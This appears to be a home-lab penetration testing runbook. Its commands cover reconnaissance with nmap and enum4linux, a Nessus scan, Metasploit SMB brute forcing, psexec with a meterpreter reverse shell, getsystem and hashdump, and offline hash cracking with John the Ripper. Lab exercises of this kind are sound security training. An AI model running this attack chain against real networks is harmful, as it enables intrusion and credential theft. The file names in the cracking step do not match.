# 🛠️ Phase 0: The "Pre-Flight"

Start 1: pfSense (Wait 1 minute)

Start 2: WinServer (Wait 2 minutes for Active Directory to spin up)

Start 3: Ubuntu Server

Start 4: Employee-PC & Kali Linux

```
ping -c 2 192.168.1.10
ping -c 2 192.168.1.20
```

---

## 🔍 Phase 1: Network Reconnaissance (On Kali)

**Scenario:** Mapping the attack surface to find the Domain Controller and FTP server.

Bash

```
# 1. Host Discovery & Service Versioning
sudo nmap -sV -O -p 21,445,3389 192.168.1.0/24

# 2. SMB User Enumeration (To find 'Employee1' or 'Administrator')
enum4linux -U 192.168.1.10
```

---

## 🛡️ Phase 2: Vulnerability Audit (On Kali)

**Scenario:** Identifying unpatched risks to justify the "Attack" phase.

```
# 1. Start the Nessus Service
sudo systemctl start nessusd

# 2. Access the Web UI
# Open Firefox to: https://127.0.0.1:8834
```

---

## ⚔️ Phase 3: Exploitation & Lateral Movement (On Kali) (Scenario 2)

**Scenario:** Gaining a "Footprint" on the server and escalating privileges.

### Step A: The Metasploit Breach

```
msfconsole -q

use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.10
set SMBUser admin-audit
set PASS_FILE /home/kali/Desktop/Reduced_Wordlist.txt
set STOP_ON_SUCCESS true
run

use exploit/windows/smb/psexec

set RHOSTS 192.168.1.10
set SMBDomain CORP
set SMBUser admin-audit
set SMBPass P@ssword2026!

set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.101
set LPORT 4444

exploit
```

### Step B: Post-Exploitation (Inside Meterpreter)

```
getsystem

hashdump
```

---

## 🔑 Phase 4: Offline Credential Cracking (On Kali)

**Scenario:** Proving that captured "hashes" are not safe if passwords are weak.

```
# 1. Save the Administrator hash to a file (Example format below)
echo {"Hash"} > Extracted_hash

# 2. Run John the Ripper to crack the hash
john --format=NT --wordlist=/usr/share/wordlists/Reduced_Wordlist.txt local_hashes.txt

# 3. View the cracked password
john --show Extracted_hash
```
